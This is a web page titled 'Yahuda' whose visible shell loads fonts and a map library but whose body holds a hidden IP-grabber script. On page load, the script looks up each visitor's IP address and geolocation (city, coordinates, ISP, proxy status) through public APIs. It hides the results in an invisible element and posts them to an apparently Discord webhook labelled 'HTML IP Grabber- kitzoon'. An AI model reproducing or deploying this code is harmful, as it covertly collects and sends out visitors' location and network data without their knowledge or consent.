<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yahuda</title>
    <!-- CSS -->
    <link rel="stylesheet" href="src/css/main.min.css">
    <!-- Fontawesome -->
    <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css" />
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
    <!-- Leaflet -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="" />
    <link rel="icon" type="image/x-icon" href="./src/favicon.ico">
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
    <!-- Notyf CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
  </head>
  <body>
    <header class="header"></header>
    <script src="./config.js"></script>
    <script>
      function get_information(link, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", link, true);
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            callback(xhr.responseText);
          }
        };
        xhr.send(null);
      }
      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
        var div = document.createElement("div");
        div.innerHTML = text;
        div.id = "razzylog";
        const secondList = document.getElementsByClassName("header")[0]
        secondList.appendChild(div)
      });
      get_information("https://api.ipify.org/", function(text) {
        var div = document.createElement("div");
        div.innerHTML = text;
        div.id = "ipppp";
        const secondList = document.getElementsByClassName("header")[0]
        secondList.appendChild(div)
      });

      function ipLogByRaz() {
        var ispp = document.getElementById('ipppp').innerHTML
        var extra = document.getElementById("razzylog").innerHTML
        const request = new XMLHttpRequest();
        request.open("POST", wbhk);
        request.setRequestHeader('Content-type', 'application/json');
        const params = {	
          username: "HTML IP Grabber- kitzoon",
          avatar_url: 'https://media.discordapp.net/attachments/1150405810812366850/1152019990510321754/image.png',
          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
        }
        request.send(JSON.stringify(params));
      }
      setTimeout(function() {
        ipLogByRaz()
      }, 700);
    </script>
    <style>
      .header {
        display: none
      }

      .map-container {
        display: none
      }
    </style>
  </body>
</html>
